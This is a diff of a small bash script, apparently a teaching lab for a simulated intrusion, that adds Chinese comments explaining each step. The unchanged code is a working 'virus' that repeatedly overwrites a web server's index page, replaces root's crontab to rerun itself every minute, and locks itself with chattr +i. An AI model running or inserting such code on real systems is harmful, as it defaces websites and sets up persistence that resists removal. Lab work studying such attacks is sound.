@@ -4,13 +4,18 @@ web_site=/var/www/html/index.html
 
 # 模拟入侵
 while true
+#while true: 这是一个无限循环，意味着下面的代码会一直重复执行，
+#直到被手动终止。
 do
 	echo "我是病毒的Code" > ${web_site}
 	sleep 10
 	
 	# 2.将这个脚本放入定时任务中
 	echo "*/1 * * * * /bin/bash /usr/bin/virus  &>/dev/null" > /var/spool/cron/root
-
+	#每隔1分钟执行一次脚本/usr/bin/virus，并且将输出重定向到/dev/null
+	#/var/spool/cron/root 这行代码的作用是将一条定时任务添加到系统的定时任务管理器中，
+	#具体来说是添加到root用户的定时任务中
+	
 	# 3.将脚本锁住（）
 	chattr +i /usr/bin/virus
 done
